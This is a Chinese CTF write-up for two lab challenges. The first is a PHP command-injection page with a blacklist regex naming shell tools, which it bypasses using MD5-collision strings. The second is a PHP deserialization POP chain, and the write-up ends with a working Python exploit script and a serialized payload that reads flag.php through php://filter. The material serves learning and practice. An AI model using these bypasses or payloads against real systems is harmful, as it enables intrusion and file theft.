

## [安洵杯 2019]easy_web

进行两次base64解密，和hex转字符串，得到类似图片名555.png。

<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>

img=555.png,可以怀疑是文件包含，直接相同方式将index.php转成TmprMlpUWTBOalUzT0RKbE56QTJPRGN3

将其重新换成代码成上述那样

5根据源代码，该页面会通过GET方式获取一个cmd参数，

然后是一个正则匹配的黑名单，如果传入的cmd的值被匹配到的话就会输出forbid。

绕过过滤后，还得通过POST传入两个md5值相等但本身不等的字符串才能执行命令。

MD5值相等的字符串我之前收集了一组，直接拿来用。

```
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

通过\来绕过正则，并通过POST传入a和b，得到flag。 使用hackbar会进行转码，传入会失败



## 反序列化的魔术方法：

1.__destruct(类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。)
2.__construct(类一执行就开始调用，其作用是拿来初始化一些值。)
3.__toString(在对象当做字符串的时候会被调用。)
4_._wakeup(该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作)
5_._sleep(在对象被序列化的过程中自动调用。sleep要加数组)
6_._invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)
7_._get(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)
8.__set(在对象访问私有成员的时候自动被调用，达到了给你看，但是不能给你修改的效果！在对象访问一个私有的成员的时候就会自动的调用该魔术方法)
9._call(当所调用的成员方法不存在（或者没有权限）该类时调用，用于对错误后做一些操作或者提示信息)
10_._isset(方法用于检测私有属性值是否被设定。当外部使用isset读类内部进行检测对象是否有具有某个私有成员的时候就会被自动调用！)
11.__unset(方法用于删除私有属性。在外部调用类内部的私有成员的时候就会自动的调用__unset魔术方法)

## 「MRCTF2020」- Ezpop

源码：

<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}

pop链：

首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php

首先分析一共有三个类

​      Modifier
​      Show
​      Test

看到Modifier这个类

class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function invoke方法，__invoke方法调用了append函数，而__invoke方法怎么触发呢？(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)好，那么我们继续往下看
看到Show这个类

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

首先看到__construct方法，这里暂时没什么用，然后我们看到__toString方法，这里是一个输出点，暂时放着，没有什么思路
看到Test这个类

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

这里有个__get()方法，我们知道(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)，而哪里使用了私有属性呢，很明显是Modifier这个类，__get方法它返回的是函数，而__invoke方法(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)

所以我们的思路是：
首先使$var=php://filter/read=convert.base64-encode/resource=flag.php
包含一个flag.php
然后使用Test类里的__get方法调用Modifier类中的__invoke方法，怎么调用呢？使$p这个变量为Modifier这个对象就可以调用__invoke方法，最后使用Show这个类里的__toString方法输出被包含的flag。
使用Test类里的__get方法调用Modifier类中的__invoke方法很简单
只需要new一个Test和new一个Modifier
然后使Test->p = new Modifier();
如果使Show->str=new Test();
然后Test这个类调用了一个不存在的变量(source)触发__get()方法。
但是这个__toString方法的调用着实卡了我好久
该怎么调用__toString方法呢？
这里我们看到源代码的一段

  public function __wakeup()
    {
        if (preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }

这里preg_match对类中的source进行比较，将它作为字符串，所以就调用了__toString方法
__toString是在对象被当成字符串的时候调用
所以这里我们需要使Show->source = new Show();
即可调用__toString方法
构造pop链：

Modifier->__invoke()->append()->flag
Test->__get()->Modifier
Show->__wakeup()->__toString()->Test

所以完整的pop链:

Show->__wakeup()(preg_match把对象当作字符串触发)->__toString()(使类中的source为Test对象，输出不存在的对象触发)->Test->__get()方法->Modifier->__invoke()(调用对象以函数的形式触发)->append()->include(文件包含，包含flag)



一键getflag.py

import requests
import base64
url = "http://dd9a4b21-3907-4515-b26b-998e448cc729.node3.buuoj.cn/?pop="
payload = 'O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";s:9:"index.php";s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"\00*\00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}'
res = requests.get(url+payload)
print(base64.b64decode(res.text))